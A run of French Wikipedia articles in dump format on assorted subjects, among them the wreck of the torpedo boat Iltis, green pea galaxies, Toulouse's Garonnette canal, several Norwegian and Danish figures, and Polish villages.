Fin , il repart en Norvège. Avec le "Jaguar", il s'arrête à Stavanger. Le "Jaguar" perd son gouvernail et est remorqué par l'autre torpilleur. L"Iltis" va à Bergen. Avec le "Z 23" et le "Z 24", le , il accompagne l"'Admiral Scheer" de Kiel à l'île d'Anholt. Du au , il est au chantier de Schiedam puis est déscativé.
En , il revient au combat. Le mois suivant, il participe à l'opération Cerberus. Durant ses missions d'escorte, il tombe à plusieurs reprises sur des escadres britanniques.
Le , l"Iltis" escorte le croiseur auxiliaire "Stier" sur la route de Hoek van Holland jusque dans le golfe de Gascogne. Le , il est attaqué par d'autres britanniques. Atteint par une torpille, il se casse et coule en quelques minutes. Des Schnellboots arrivent deux heures après et secourent trente-trois hommes. Cent quinze membres d'équipage sont morts, dont le commandant.
L'épave de l'Iltis repose au large d'Ambleteuse au nord de Boulogne sur Mer sur un fond moyen de 40 mètres à marée basse. L'explosion de la torpille a pulvérisé la partie centrale du navire et de nombreux débris sont éparpillés sur le fond autour de l'épave.
Le navire s'est replié sur lui même, la partie avant touchant la partie arrière.
L'arrière du navire repose droit sur le fond, les deux canons de 105mm demeurant à poste. Le canon de 105mm de l'avant est tombé entre les deux parties de la coque, pointant vers la surface.
A proximité de l'épave, il est possible d'observer un affût triple lance torpilles posé sur le fond.

</doc>
<doc id="8979279" url="https://fr.wikipedia.org/wiki?curid=8979279" title="1875 en Bretagne">
1875 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1875 en Bretagne.

</doc>
<doc id="8979284" url="https://fr.wikipedia.org/wiki?curid=8979284" title="Exupère d'Agaune">
Exupère d'Agaune

Exupère d'Agaune (latin "Exuperius") est un saint chrétien, officier de la légion thébaine, venu d'Égypte, compagnon de saint Maurice. Il aurait subi le martyre à Agaune, aujourd'hui Saint-Maurice, en Valais, en même temps que tous les membres de cette légion, sous le règne de l'empereur Dioclétien et sur l'ordre de Maximien, à la fin du . Le caractère historique de cet épisode, rapporté par Eucher de Lyon (370-449), évêque de Lyon qui avait visité le Valais, n'est pas avéré. Selon Eucher, Exupère était un "campidoctor", officier ou sous-officier instructeur chargé de la formation des recrues.
Culte.
La tradition rapporte que ses reliques furent transférées à l'abbaye bénédictine de Gembloux, près de Namur, en Belgique, par son fondateur Guibert de Gembloux. Il y fut particulièrement honoré.
En France, les églises au vocable de saint Exupère sont pour la plupart dédiées soit à Exupère de Bayeux, soit à Exupère de Toulouse. Cependant, à Saint-Exupéry-les-Roches en Corrèze, l'église est dédiée à saint Exupère et saint Maurice, il s'agit donc bien dans ce cas du martyr d'Agaune.
Il est fêté le , comme saint Maurice.
Représentations figurées.
On connaît au moins une représentation d'Exupère d'Agaune dans l'art. Il s'agit d'un panneau peint (volet gauche de retable) conservé à la National Gallery de Londres ; il est attribué à un peintre anonyme allemand de la seconde moitié du , connu sous le nom de Maître de Liesborn et représente Exupère entre saint Ambroise et saint Jérôme. Une inscription sur les auréoles des saints les identifie ; celui du milieu est désigné comme Exupère, martyr et chevalier ; il est revêtu en effet d'une armure et muni d'une épée et d'un bouclier ; ce costume militaire le distingue des autres saints du même nom. L'identification est confirmée par le fait que le volet droit du même retable, également conservé à la National Gallery, représente saint Maurice entre saint Grégoire et saint Augustin ; les deux panneaux se répondent exactement et représentent les martyrs de la légion thébaine entre les quatre pères de l'Église latine traditionnellement représentés par l'iconographie occidentale.

</doc>
<doc id="8979285" url="https://fr.wikipedia.org/wiki?curid=8979285" title="Famille Mayor de Lutry">
Famille Mayor de Lutry

La famille Mayor de Lutry est une famille noble qui détenait l'office de la mayorie de Lutry.
Histoire.
Petrus est le premier membre cité de la famille en 1160. Anselme est cité en 1174.
Claude, le dernier descendant mâle de la famille décède en 1597.
Possessions.
La famille a possédé des biens dans le bourg de Lutry.
La famille a possédé la coseigneurie de Pont-en-Ogoz.

</doc>
<doc id="8979286" url="https://fr.wikipedia.org/wiki?curid=8979286" title="Saladin Ahmed">
Saladin Ahmed

Saladin Ahmed, né le à Détroit dans le Michigan, est un écrivain américain de science-fiction et de fantasy.

</doc>
<doc id="8979287" url="https://fr.wikipedia.org/wiki?curid=8979287" title="Galaxie petit pois">
Galaxie petit pois

Une galaxie petit pois est un type de galaxie compacte bleue lumineuse qui présente un très fort taux de formation d'étoiles. Les galaxies petit pois sont nommées ainsi car elles sont de petite taille et présentaient un aspect verdâtre sur les images prises par le télescope du "Sloan Digital Sky Survey" (SDSS).
Les galaxies petit pois ont été découvertes pour la première fois par les contributeurs du projet collaboratif en ligne "Galaxy Zoo".
Description.
Les galaxies petit pois (GPP) sont des galaxies compactes présentant une forte raie d'émission dans l'oxygène. Elles ont été découvertes à des valeurs de décalage vers le rouge situées entre "z" = 0,112 et "z" = 0,360. Ces galaxies à faible masse ont une limite supérieure de taille d'environ (), elles résident typiquement dans des environnements comportant une densité des deux-tiers inférieure aux environnements des galaxies normales. Une GPP moyenne a un décalage vers le rouge de "z" = 0,258, une masse d'environ 3 200 millions de masses solaires, un taux de formation d'étoiles d'environ 10 masses solaires par an, une largeur équivalente dans l'oxygène doublement ionisé ([O III]) de , et une faible métallicité. Les GPP sont seulement des galaxies à formation d'étoiles, elles n'ont pas de noyau actif. Elles présentent une forte raie d'émission à la longueur d'onde de l'[O III] (). Cette longueur d'onde est une raie interdite du spectre électromagnétique, elle est uniquement rendue possible ici par la très faible densité du milieu. Lorsque l'intégralité de la base de données photométrique du SDSS a été interrogée à la recherche de GPP, seuls 40 222 objets ont été retournés, ce qui laisse à penser que ces galaxies sont des objets rares.
Les GPP sont les galaxies les moins massives et les plus actives en formation d'étoiles de l'univers local. , dit Kevin Schawinski, astrophysicien, professeur à l'École polytechnique fédérale de Zurich. .
Les GPP existaient à un âge où l'univers avait les trois-quarts de son âge actuel, ce sont donc de bons indicateurs de la formation de galaxies dans un univers jeune. Depuis la publication des travaux de l'équipe de R. Amorín en février 2012, on pense que les GPP seraient de vieilles galaxies qui auraient formé la majeure partie de leurs étoiles il y a plusieurs milliards d'années. De vieilles étoiles ont pu être identifiées par spectroscopie dans l'une des trois galaxies étudiées grâce à la présence de magnésium.
En janvier 2016, une étude publiée par le journal "Nature" identifie la GPP J0925+1403 comme laissant échapper des photons du continuum Lyman (LyC) avec un taux d'échappement d'environ (voir section ci-dessous). En 2014-2015, deux sources distinctes ont identifié deux GPP (J1219 et J0815) comme probables galaxies à , suggérant que ces deux GPP sont les analogues, dans les faibles décalages vers le rouge, des galaxies à dans les importants décalages vers le rouge, dont seulement deux sont connues : "Haro 11" et "Tololo-1247-232". Trouver des galaxies à fuite de LyC locales est crucial pour les théories de l'univers jeune à l'ère de la réionisation. Ces deux objets ont les références SDSS DR9 suivantes : 1237661070336852109 (GP_J1219) et 1237664668421849521.
L'image ci-contre montre la galaxie petit pois GP_J1219. Elle a été prise par une équipe du télescope spatial Hubble (HST) dirigée par Alaina Henry, en utilisant un instrument nommé "spectrographe des origines cosmiques" (COS) dans le proche ultraviolet. La barre horizontale sur l'image représente une seconde d'arc (1"), c'est-à-dire environ (al) à la distance de GP_J1219 (2,69 millions al). En utilisant le "Multi-Anode Micro-channel Array" du COS dans le proche ultraviolet, l'échelle du capteur est d'environ par seconde d'arc (0,0235" par pixel).
Historique des découvertes.
Décembre 2007.
"Galaxy Zoo" (GZ) est un projet collaboratif en ligne créé en 2007 qui s'était donné pour objectif de classifier environ un million de galaxies. En juillet 2007, quelques jours après la naissance de GZ, une discussion fut lancée sur leur forum par Hanny Van Arkel, intitulée (littéralement ), à laquelle étaient jointes plusieurs images représentant des objets verts. Cette contribution, qui débuta de manière plutôt humoristique (un jeu de mots sur la chanson de John Lennon "Give Peace a Chance"), prit une tournure plus scientifique lorsqu'en décembre 2007, il devint évident que certains de ces étranges objets formaient un nouveau groupe de galaxies. Ces apparaissaient sur les images du "Sloan Digital Sky Survey" (SDSS) sous forme de lueurs vertes diffuses. C'est parce que ces galaxies présentent une intense raie d'émission dans l'oxygène fortement ionisé, ce qui sur les images composites du SDSS se traduit par une augmentation de la luminosité dans la bande de couleur du capteur, par rapport aux deux autres bandes de couleur et . La bande de couleur est représentée en vert sur les images du SDSS.
Juillet 2008.
Enthousiastes, se nommant eux-mêmes les (littéralement , un autre jeu de mots sur les "Peace Corps"), un groupe de contributeurs a identifié plus d'une centaine de ces galaxies, qui furent rassemblées dans une nouvelle discussion dédiée sur le forum GZ, initiée par Carolin Cardamone en juillet 2008. Ces premières données ont permis la recherche systématique d'autres objets du même type dans la base de données GZ ; parmi le millions d'objets qu'elle contenait au total, 251 galaxies pois, plus connues sous le nom de (GPP), furent trouvées.
Novembre 2009.
En novembre 2009, les auteurs C. Cardamone, Kevin Schawinski, M. Sarzi, S. Bamford, N. Bennert, C. Urry, Chris Lintott, W. Keel et neuf autres personnes ont publié un article dans le MNRAS intitulé . Dans cet article, dix contributeurs bénévoles du projet "Galaxy Zoo" ont été distingués pour leur aide particulièrement significative. Ils se nomment : Elisabeth Baeten, Gemma Coughlin, Dan Goldstein, Brian Legg, Mark McCallum, Christian Manteuffel, Richard Nowell, Richard Proctor, Alice Sheppard et Hanny Van Arkel. Ils ont été remerciés pour (). Les citations dont cet article ont fait l'objet sont consultables sur le site de la NASA dédié aux données astrophysiques. Pour plus de détails, voir les sections "Physique dans la publication Cardamone 2009" et "Analyse de la publication Cardamone 2009".
Les GPP étudiées dans cet article n'avaient pas toutes été découvertes récemment. Sur les 80 galaxies de l'échantillon original, 46 d'entre elles avaient déjà fait l'objet de références antérieures dans la base de données extragalactique de la NASA. Les 80 GPP originales provenaient toutes d'un échantillon du SDSS "data-release 7" (DR7), à l'exclusion d'autres sources. Certaines sources contenaient des objets qui auraient pu être classés comme GPP s'ils s'étaient trouvés dans l'échantillon du SDSS. On en trouve un exemple dans un article publié en avril 2009 dans "The Astrophysical Journal", par les auteurs J. J. Salzer, A. L. Williams et C. Gronwall, sous le titre . Dans cet article sont présentées de . Ces objets avaient été sélectionnés à l'aide du "KPNO International Spectroscopic Survey" (KISS). Au moins trois de ces 15 objets sont verts sur les images du SDSS (KISSR 1516, KISSR 2042 et KISSRx 467). Citant Salzer "et al." 2009, section 4.1 : .
Juin 2010.
En juin 2010, les auteurs R. Amorin, E. Perez-Montero et J.M. Vilchez ont publié un article dans "The Astrophysical Journal" intitulé . Dans cet article ils étudient les incohérences des mesures concernant la métallicité de 79 GPP, mettant en doute les résultats originaux publiés par Cardamone "et al". Ils concluent : . Pour plus de détails, voir la section "Deux publications de R.Amorin, J.M.Vilchez et E.Perez-Montero".
Février 2011.
En février 2011, les auteurs Y. Izotov, N. Guseva et T.X. Thuan publièrent dans "The Astrophysical Journal" un article intitulé : . Ils ont découvert que les 80 GPP ne forment pas à elles seules une nouvelle classe de galaxies rares, mais qu'elle représentent plutôt une sous-classe de galaxies déjà connues sous le nom de galaxies compactes lumineuses, dont 803 exemplaires ont été identifiés à ce jour. Pour plus de détails, consultez la section "Comparaison entre galaxies petit pois et galaxies compactes lumineuses"
Novembre 2011.
En novembre 2011, les auteurs Y. Izotov, N. Guseva, K. Fricke et C. Henkel ont publié un article dans le journal "Astronomy and Astrophysics" intitulé : . Dans cet article, les auteurs étudient quatre galaxies de couleur rouge à des longueurs d'onde comprises entre (W1) et (W2). Les mesures indiquent que la contenue dans ces galaxies est à une température d'environ . Ces quatre galaxies sont des GPP et font plus que doubler le nombre de galaxies de ce type connues à ce jour.
Janvier 2012.
En janvier 2012, les auteurs R. Amorin, R. Perez-Montero and J.Vilchez ont publié le compte-rendu d'une conférence intitulée . Dans cette publication, ils annoncent avoir mené une série d'observations à l'aide du spectromètre OSIRIS du "Gran Telescopio Canarias", et indiquent qu'ils sont sur le point de publier un article concernant ces recherches. Ces observations . Pour plus de détails, voir la section "Deux publications de R.Amorin, J.M.Vilchez et E.Perez-Montero".
En janvier 2012 également, les auteurs L. Pilyugin, J. Vilchez, L. Mattsson et T.X. Thuan ont publié un article dans le MNRAS intitulé . Dans cet article les auteurs comparent les abondances relatives de l'oxygène et de l'azote à l'aide des mesures globales de raies d'émission des spectres du SDSS, en utilisant (1) la méthode de la température des électrons et (2) les récentes calibrations des raies d'émission oxygène/azote et azote/soufre. Trois catégories d'objets furent comparées : un groupe de nébuleuses composites riches en hydrogène, 281 galaxies du catalogue SDSS, et un échantillon de GPP comportant des raies d'émission perceptibles dans l'[O III]. L'une des questions que l'on se pose à propos des GPP, c'est comment les nébuleuses influencent les spectres mesurés. En comparant ces trois catégories d'objets à l'aide de méthodologies éprouvées et de l'analyse de leur métallicité, les auteurs concluent que .
Toujours en janvier 2012, S. Hawley publia un article dans les "Publications of the Astronomical Society of the Pacific" intitulé . Dans cet article, l'ancien astronaute de la NASA Steven A. Hawley compare les résultats publiés dans de précédents articles à propos des mesures de métallicité des GPP. L'auteur passe en revue les différentes méthodes de calibration et d'interprétation des résultats, principalement depuis les publications Cardamone "et al." et Amorin "et al.", mais également depuis Izotov "et al.", et suggère une explication possible aux nombreuses contradictions dans les résultats de ces différentes études. Il a pris en compte la contribution des étoiles de Wolf-Rayet dans l'ionisation des gaz, et déterminé quels types de raies d'émission donnaient les résultats les plus précis pour ces galaxies. Il conclut : .
J0925+1403 et fuite de photons LyC.
En janvier 2016, le journal "Nature" a publié un article ayant pour titre , signé Y.I. Izotov, I. Orlitová, D. Schaerer, T.X. Thuan, A. Verhamme, N.G. Guseva &amp; G. Worseck. Le résumé indique : On pense que ces niveaux de radiation sont similaires à ceux qu'émettaient les premières galaxies de l'univers, nées à l'ère de la réionisation. Ces découvertes ont mené l'équipe de recherche, incluant des scientifiques de l'Université de Genève, à la conclusion que J0925 pouvait ioniser le milieu intergalactique jusqu'à quarante fois sa propre masse stellaire.
Cette étude a été menée à la suite des observations effectuées avec le spectrographe des origines cosmiques à bord du télescope spatial Hubble, comme décrit dans la proposition 13744 du cycle 22.
Émissions Lyman-alpha depuis les galaxies petit pois.
En mai 2015, les auteurs Alaina Henry, Claudia Scarlata, Crystal Martin et Dawn Erb ont publié un article titré . Le but de ces travaux était de comprendre pourquoi certaines galaxies produisent des émissions Lyman-alpha (Ly α), alors que d'autres n'en produisent pas. De très nombreuses conditions physiques régulent l'émission de ce type de spectre, par conséquent connaître les caractéristiques de cette émission est fondamental pour comprendre comment les galaxies se forment et comment elles impactent leur environnement intergalactique.
Henry "et al." émirent l'hypothèse que, puisque les GPP ressemblaient au galaxies ayant un décalage vers le rouge d'une valeur z &gt; 2, et que les émissions Ly α sont habituelles à ces valeurs de décalage vers le rouge, les raies Ly α devraient également être émises par les GPP. Les observations menées avec le télescope spatial Hubble (HST) et l'instrument COS (voir section "Description") ont conforté cette hypothèse pour les 10 GPP de l'échantillon. Les spectres des diagrammes ci-contre montrent une résonance dans la diffusion des photons Ly α qui sont émis à une vélocité quasiment nulle. La richesse des données existantes sur les GPP, combinée aux spectres réalisés par le COS, ont permis à Henry "et al." d'explorer les mécanismes physiques qui régulent les émissions Ly α. Les auteurs ont conclu que les variations de quantité de gaz hydrogène neutre, qui diffusent les photons Ly α, sont la cause d'une différence de facteur 10 dans les émissions Ly α des GPP de leur échantillon.
Le spectre de GP_J1219 (dont une image figure dans la section "Description") montre des flux d'émissions très puissants, comparé aux 9 autres GPP. En fait, seule GP_J1214 présentes des valeurs d'émissions approchant J1219. À noter également les doubles crêtes dans certains spectres, indiquant des flux d'entrée et de sortie de matière de la GPP.
Physique dans la publication Cardamone 2009.
À l'époque où cet article fut publié, seulement cinq galaxies petit pois (GPP) avaient été observées par le télescope spatial Hubble (HST). Trois de ces images montraient les GPP comme composées de brillantes grappes d'étoiles en formation, avec une faible densité de surface, suggérant que ces objets résultaient d'une fusion de galaxies récente ou encore en cours. Ces trois images du HST provenaient d'une étude réalisée en 2005 sur un échantillon de galaxies locales lumineuses dans l'ultraviolet. Les grandes galaxies fusionnées sont fréquemment le site d'une intense activité de formation d'étoiles, comme le montre le graphe ci-contre qui représente le taux de formations d'étoiles par rapport à la masse galactique. Sur ce graphe, les GPP sont comparées avec les 3 003 galaxies fusionnées issues du catalogue Galaxy Zoo Merger Sample (GZMS). On peut voir que les GPP ont une faible masse, typique des galaxies naines, et que leur taux de formation d'étoiles est plus important que celui des GZMS. La ligne noire pointillée représente un taux de formation d'étoile constant de /an (10 masses solaires par an). La plupart des GPP ont un taux de formation d'étoiles compris entre /an et /an.
Les GPP sont rares. Parmi le million d'objets figurant dans les banques d'images du projet Galaxy Zoo (GZ), seules 251 GPP ont pu être identifiées. Après avoir écarté 148 objets à cause de la contamination atmosphérique affectant leur spectre, les 103 objets restants, qui présentaient les meilleurs rapports signal/bruit (SNR), furent étudiés plus en détail via l'analyse de leurs raies d'émission par Baldwin, Phillips et Terlevich, qui ont pu différencier les galaxies à flambée d'étoiles (GFE) des galaxies à noyau actif (AGN). 80 se sont révélées être des GFE. Le graphe ci-contre représente 103 GPP à étroite bande (toutes avec un SNR ≥ 3 dans leurs raies d'émission) en tant que 10 AGN (losanges bleus), 13 objets de transitions (croix vertes) et 80 GFE (croix rouges). La ligne continue (notée Ke01) représente le maximum de contribution des GFE (Kewley "et al." 2001). La ligne pointillée (notée Ka03) représente la séparation entre les AGN et les pures galaxies à formation d'étoiles (Kauffmann "et al." 2003).
Les GPP présentent une forte émission dans la raie de l'oxygène doublement ionisé [O III], comparativement à l'ensemble de leur spectre. Sur les spectres du Sloan Digital Sky Survey (SDSS), cela se manifestait sous la forme d'une large crête avec la raie [O III] au sommet.
La longueur d'onde de l'[O III] () a été choisie pour déterminer la luminosité des GPP par la comparaison des largeurs équivalentes. L'histogramme ci-contre présente sur une échelle horizontale les largeurs équivalentes de 10 000 galaxies normales (en rouge), de 215 galaxies lumineuses dans l'ultraviolet (UV-lumineuses, en bleu), et de GPP (en vert). Comme on peut le voir sur l'histogramme, la largeur équivalente des GPP est même bien plus grande que celle des prolifiques pouponnières d'étoiles que sont pourtant les galaxies UV-lumineuses.
Dans la publication Cardamone "et al.", des comparaisons sont faites avec d'autres types de galaxies compactes, comme les galaxies naines compactes bleues et les galaxies UV-lumineuses, situées à des distances locales mais aussi plus lointaines. Le résultat de l'étude indique que les GPP forment une classe de galaxies différentes des naines compactes bleues, mais qu'elles pourraient toutefois ressembler aux membres les plus lumineux de cette catégorie. Les GPP sont également similaires aux galaxies UV-lumineuses à fort décalage vers le rouge, comme les galaxies "Lyman-break" ou les émetteurs Lyman-alpha. Les auteurs concluent que si les processus internes animant les GPP sont similaires à ceux que l'on trouve dans les galaxies UV-lumineuses à fort décalage vers le rouge, les GPP pourraient représenter les derniers vestiges du mode ordinaire de formation d'étoiles ayant eu cours durant la jeunesse de l'univers.
Analyse de la publication Cardamone 2009.
Les valeurs présentées dans le tableau ci-dessous sont extraites des pages 16 et 17 de la publication Cardamone "et al." 2009, récapitulant les caractéristiques des 80 galaxies petit pois (GPP) qui y ont été analysées.
La sélection des couleurs a été obtenue par la différence de niveaux entre trois filtres, dans les limites suivantes : u-r ≤ 2.5 (1), r-i ≤ -0.2 (2), r-z ≤ 0.5 (3), g-r ≥ r-i + 0.5 (4), u-r ≥ 2.5 (r-z) (5). On peut voir cette séparation dans les spectres de couleurs sur le diagramme ci-contre. Le diagramme couleur-couleur représente une centaine de GPP (croix vertes), dix mille galaxies de comparaison (points rouges) et neuf mille cinq cents quasars de comparaison (points violets), situés à des valeurs de décalage vers le rouge comparables à celles des GPP. Les lignes noires représentent les frontières de séparation entre ces différents objets.
Il peut être utile de comparer une GPP à notre propre galaxie, la Voie lactée, pour se faire une idée représentative de leur taux de formation d'étoiles. Une GPP moyenne a une masse d'environ 3 200 millions (3 200 millions de masses solaires). La Voie lactée est une galaxie spirale de 1 125 000 millions . La Voie lactée est donc environ aussi massive que 390 GPP.
On sait que la Voie lactée convertit environ /an (2 masses solaires par an) de gaz interstellaire en étoiles. Une GPP moyenne en convertit environ /an, ce qui représente 5 fois le taux de formation de la Voie lactée.
Un des moyens historiques d'identifier les GPP, avant l'utilisation de requêtes SQL, consistait à repérer les contradictions dans leur classement sur Skyserver (site web du SDSS). Sur les 251 échantillons originaux de GPP identifiés par l'un des instruments du SDSS comme ayant des spectres de galaxies, seulement 7 d'entre elles avaient été reconnues comme galaxies par un autre instrument, c'est-à-dire que 244 avaient été .
Deux publications de R.Amorin, J.M.Vilchez et E.Perez-Montero.
En juin 2010, les auteurs R. Amorin, E. Perez-Montero et J.M. Vilchez ont publié un article dans "The Astrophysical Journal" intitulé , qui met en doute les valeurs de métallicité des GPP annoncées dans la publication Cardamone "et al." 2009. Amorin "et al." ont utilisé une méthodologie différente de Cardamone "et al." pour publier des valeurs de métallicité différentes de plus d'un cinquième () des valeurs précédentes pour les 80 GPP à flambée d'étoiles. Les valeurs moyennes indiquent que 12 + log(O/H) &lt; 8,05, ce qui représente un décalage d'environ 0,65 ordre de magnitude entre les deux publications.
Pour ces 80 GPP, Amorin "et al." ont utilisé une méthode directe, plutôt que la méthode à large bande utilisée par Cardamone "et al.", ils ont aussi calculé les propriétés physiques ainsi que les taux d'abondance de l'oxygène et l'azote ionisés. Ces métaux progressivement l'hydrogène et l'hélium, constituants majoritaires de la matière présente dans les galaxies. Ces métaux étant produits par les supernovae, plus une galaxie est vieille et plus elle devrait contenir de métal. Comme les GPP sont relativement proches de nous, c'est-à-dire situées dans un univers , elles devraient comporter plus de métaux que les galaxies lointaines du univers.
Comparaison entre galaxies petit pois et galaxies compactes lumineuses.
En février 2011, Yuri Izotov, Natalia Guseva et Trinh Xuan Thuan publièrent un article intitulé : , où ils examinèrent les GPP en les comparant à un plus large échantillon de 803 galaxies compactes lumineuses (GCL). Ils ont utilisé des critères de sélection différents de ceux utilisés par Cardamone "et al.", à savoir :

</doc>
<doc id="8979291" url="https://fr.wikipedia.org/wiki?curid=8979291" title="1876 en Bretagne">
1876 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1876 en Bretagne.

</doc>
<doc id="8979292" url="https://fr.wikipedia.org/wiki?curid=8979292" title="Anergie (homonymie)">
Anergie (homonymie)

Anergie peut désigner :

</doc>
<doc id="8979293" url="https://fr.wikipedia.org/wiki?curid=8979293" title="Aimé Baboin">
Aimé Baboin

Jean Joseph Aimé Baboin, né le 8 décembre 1809 à Saint-Vallier et décédé le 14 février 1870 à Nice, fut un industriel en soie et tulle de soie, fondateur des soieries Aimé Baboin &amp; Cie à Saint-Vallier et Lyon.
Biographie.
Aimé Baboin importe en France le procédé de tulle de soie, et gagne rapidement des parts de marché importantes en France et à l'international. À l'occasion de l'Exposition universelle de 1867, il déclare employer 1300 personnes pratiquant 250 métiers.
Aimé Baboin finance la fondation de l'École centrale de Lyon en 1857, et la construction de la basilique de Fourvière. Il acquiert également le Château de Loyes en 1850, propriété toujours entre les mains de la famille Baboin au début du .
Décédé en 1870 à Nice, Aimé Baboin est inhumé au cimetière de Loyasse à Lyon.

</doc>
<doc id="8979294" url="https://fr.wikipedia.org/wiki?curid=8979294" title="Høegh">
Høegh



</doc>
<doc id="8979295" url="https://fr.wikipedia.org/wiki?curid=8979295" title="Garonnette">
Garonnette

La , aussi nommé petite Garonne, canal de Lissac (ou Lyssac), est un ancien bras de la Garonne à Toulouse qui délimitait avec le cours principal du fleuve l’île de Tounis, et qui a été asséché en 1954. Aménagée en 2006-2007, l’avenue de la Garonnette qui lui avait succédé a retrouvé un petit canal et un cheminement piétonnier.
Description.
Moulins du Château narbonnais.
La Garonnette était enjambée en amont par un pont de sept arches qui supportait un ensemble de moulins de seize meules, appelés moulins du château Narbonnais, en raison de leur proximité avec le château des comtes de Toulouse. Ces moulins, comme ceux du Bazacle un peu plus bas sur la Garonne, étaient constitués en société par actions. La Garonnette constituait le canal de fuite de ces moulins et on a pu émettre l’hypothèse qu’elle avait été creusée à cette fin. Mais il est plus probable que l’île de Tounis existait de haute antiquité, tandis que des îles moins pérennes (les "ramiers") se formaient et disparaissaient selon les fluctuations de la Garonne.
Après une inondation qui emporte la chaussée d’amenée, les moulins sont abandonnés au début du vingtième siècle, et détruits quelques années plus tard par un incendie. En 1924, pour donner plus de puissance à la centrale hydroélectrique du Ramier, on ferme les vannes des anciens moulins, ce qui précipite d’autant l’assèchement de la Garonnette.
Activités.
Outre les moulins, les rives de la Garonnette étaient occupées par des lavoirs et des bateaux-lavoirs. Au fil du temps avaient été repoussées vers la Garonnette et l’île de Tounis toutes les activités malodorantes, comme la vente du poisson, les abattoirs, les corroyeries et tanneries, etc.
Pont de Tounis.
Vers le milieu du cours de la Garonnette se trouve le pont de Tounis, qui reliait l’île au quartier de la Dalbade. C’est un pont en brique, le plus ancien de Toulouse, antérieur d’un siècle au Pont-Neuf sur la Garonne. Il comportait plusieurs arches dont une seule demeure apparente, les autres ayant été englobées dans les constructions voisines.
Le pont de Tounis, prolongé par la rue du même nom, accédait à un pont qui traversait la Garonne pour aboutir à l’actuelle prairie des Filtres, appelé au le Pont de bois, vestige probable d’un pont plus ancien, le pont de Comminges.
Pont de bois, pont de Pigasse, pont de fil de fer.
Enfin, avant le débouché de la Garonnette dans la Garonne, au niveau du Pont-Neuf, se trouvait le pont de Pigasse, qui reliait la Halle aux poissons à la pointe de l’île de Tounis. Construit à la fin du seizième siècle, en bois, d’où son premier nom, le "pont de bois", il s’écroule et est reconstruit à plusieurs reprises, et disparaît définitivement en 1767. Il est remplacé par un bac. En 1871 on construit un pont suspendu étroit, plutôt une passerelle, baptisé par les Toulousains "le pont de fil de fer". On appelle parfois actuellement pont Pigasse le pont qui franchit la Garonnette à sa jonction avec la Garonne, et qui unit les quais de la Daurade et de Tounis, par la place du Pont-Neuf.
Assèchement de la Garonnette.
Avec l’arrêt des moulins, qui entretenaient la circulation de l’eau, la Garonnette devint peu à peu insalubre, polluée par les rejets d’eaux usées des riverains. En 1947, l’entreprise chargée de rénover le Pont-Neuf doit dégager la première arche, encombrée par les alluvions, et est autorisée par la municipalité à déposer les matériaux le long de la Garonnette : c’est le début du comblement, avec seulement un égout fluvial de 300 m, qui est terminé en 1954. Avec la construction d’un immeuble de logements sur l’emplacement des moulins, la physionomie du quartier est radicalement transformée. La rue de la Garonnette sert de parc de stationnement.
En 2006-2007, un petit canal et un aménagement piétonnier sont établis.

</doc>
<doc id="8979303" url="https://fr.wikipedia.org/wiki?curid=8979303" title="1877 en Bretagne">
1877 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1877 en Bretagne.

</doc>
<doc id="8979312" url="https://fr.wikipedia.org/wiki?curid=8979312" title="Annelise Høegh">
Annelise Høegh

Annelise Høegh est une personnalité politique norvégienne, née le à Oslo et morte le .
Biographie.
Annelise Høegh étudie à l'université d'Oslo. Membre du parti conservateur (Høyre), elle représente Oslo au parlement norvégien entre 1985 et 2001.
À partir de 2007, elle siège au conseil municipal de la ville d'Oslo. À partir de 2010, elle préside le (Centre d'études sur l'holocauste et les minorités religieuses).
Vie privée et famille.
Annelise Høegh est la fille du général . Elle épouse en 1985 l'homme politique et écrivain Jo Benkow. Benkow préside le Parlement de 1985 à 1993, il meurt en 2013. Annelise Høegh, qui est atteinte d'un cancer, meurt le à l'âge de 66 ans.

</doc>
<doc id="8979314" url="https://fr.wikipedia.org/wiki?curid=8979314" title="(8709) Kadlu">
(8709) Kadlu

(8709) Kadlu est un astéroïde Amor découvert le par Carolyn S. Shoemaker et Eugene M. Shoemaker à l'observatoire Palomar.
Il est nommé d'après la déesse Kadlu de la mythologie inuit.

</doc>
<doc id="8979315" url="https://fr.wikipedia.org/wiki?curid=8979315" title="Taczów">
Taczów

Taczów (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979319" url="https://fr.wikipedia.org/wiki?curid=8979319" title="Taczowskie Pieńki">
Taczowskie Pieńki

Taczowskie Pieńki (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979320" url="https://fr.wikipedia.org/wiki?curid=8979320" title="8709 Kadlu">
8709 Kadlu



</doc>
<doc id="8979321" url="https://fr.wikipedia.org/wiki?curid=8979321" title="Ole Lando">
Ole Lando

Ole Lando, né le à Copenhague et mort le , est un juriste danois.
Biographie.
Ole Lando est issu d'une famille de libéraux. Son père Zelman Lando était le fils d'un industriel juif riche de Varsovie. Le père Lando a été choqué par le fait que les étudiants, au début de la guerre, étaient internés à Francfort en 1914 en tant que citoyen russe. Après un vol ??? pour la Suède, son père s'installe en 1915 au Danemark et devient en 1925 professeur d'économie à l'École de commerce de Copenhague.
Ole Lando naît en 1922. En 1940, à 18 ans, il commence des études de droit à l'université de Copenhague. Il est l'élève d'Alf Ross. Pendant la Seconde Guerre mondiale, il sympathise avec les communistes danois, les considérant comme « les vrais amis des pauvres ». Le , il s'enfuit avec son père lors de l'« Opération Nuit et brouillard » grâce à Résistance danoise exfiltrant les Juifs danois vers la Suède. En Suède, il poursuit ses études en cours privés. En 1944, il est devenu un soldat de la « Brigade danoise » (Den Danske Brigade / Danforce). Deux ans après sa libération en 1947, il obtient son diplôme et rejoint le ministère danois de la Justice. En 1951, il a fait un voyage d'études à Paris et à Oxford, où il a rencontré Martin Wolff.
